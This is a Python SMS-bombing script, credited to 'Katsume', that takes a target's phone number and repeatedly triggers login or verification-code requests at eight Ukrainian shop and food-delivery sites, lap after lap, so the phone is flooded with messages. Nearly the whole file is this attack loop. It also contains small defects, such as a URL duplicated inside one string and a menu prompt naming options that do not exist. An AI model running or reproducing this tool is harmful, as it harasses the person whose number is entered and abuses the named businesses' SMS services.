from termcolor import colored
from func import *

clear()
print(colored('''
┌─┐ ┌┬┐┌─┬┐┌─┬─┐┌─┐
││└┐││││┌┤││┌┤│└┘││
│┌┐└┘│└┘┘│└┘┘│┌┐┌┐│
││└┐││┌┐││┌┐│││││││
││ │││││└┤││└┤│││││
└┘ └─┴┘└─┴┘└─┴┘└┘└┘
           ''', 'red'), '8 services')
menu()
choose = input('Choose: ')

while True:

    if choose == "1":
        clear()
        phone = input("Enter the number(Without +): ")

        phone_two = phone[2:]
        phone_full = '+' + phone[:2] + '(' + phone[2:5] + phone[5:5] + ')' + phone[5:8] + '-' + phone[8:10] + '-' + phone[10:12]
        phone_plus = '+' + phone

        second = int(input("Enter the number of seconds between requests - "))
        circle = int(input("Enter the number of laps - "))
        x = 0

        while x <= circle:
            x = x + 1

            request('TarantinoFamily', 'https://www.tarantino-family.com/wp-admin/admin-ajax.php', 'phone', phone, second)
            request('Mamamia', 'https://mamamia.ua/api/auth/login', 'phone', phone_two, second)
            request('Riksha', 'https://riksha.com.ua/check-auth-methodhttps://riksha.com.ua/check-auth-method', 'phone_number', phone_full, second)
            request('Budusushi', 'https://be.budusushi.ua/login', 'LoginForm[username]', phone_two, second)
            request('Eco-Food', 'http://eco-food.com.ua/send_password/', 'phone', phone_two, second)
            request('Monopizza', 'https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode', 'recipient', phone_plus, second)
            request('La.ua', 'https://la.ua/wp-admin/admin-ajax.php?lang=uk', 'formData', f'tel=%2B{phone_full[1:]}&code=', second)
            request('Foxtrot', 'https://www.foxtrot.com.ua/ru/account/login', 'phone', phone_full, second)

            print('----------------------')
            print(f'{colored("[*]", "blue")} {x} lap completed')
            print('----------------------')

            if x == circle:
                exit()

    elif choose == '2':
        clear()
        print(f'About: \n Created by Katsume. \n TG: @katsumeoff \n Github: github.com/0katsume')
        menu()
        choose = input('Choose: ')

    elif choose == "0":
        exit()

    else:
        clear()
        print(colored('\n Please write 0-3', 'red'))
        menu()
        choose = input('Choose: ')
